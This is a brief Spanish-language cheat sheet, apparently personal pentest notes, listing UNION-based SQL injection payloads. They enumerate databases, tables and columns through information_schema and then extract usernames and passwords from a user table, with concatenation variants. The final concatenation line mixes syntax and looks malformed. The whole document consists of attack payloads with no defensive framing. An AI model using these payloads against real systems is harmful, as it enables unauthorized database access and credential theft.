- Tags : #sql #sqlinjection #bd_enumeration

Enumeracion de las BD 
```sql
union select NULL,group_concat(schema_name) from information_schema.schemata
```

Enumerar las tablas de la BD
```sql
union select NULL,table_name from information_schema.tables where table_schema='public'
```

Enumerar Columnas
```sql
union select NULL,column_name from information_schema.columns where table_schema='public' and table_name='users_vidmbr'
```

Extraccion de user y pass
```sql

union select username,password from NombreTabla 

Para concatenear la salida en un campo 
union select NULL,concat(username,':',password) from NombreTabla 

union select NULL,concat(username,||'->'||,password) from NombreTabla 
```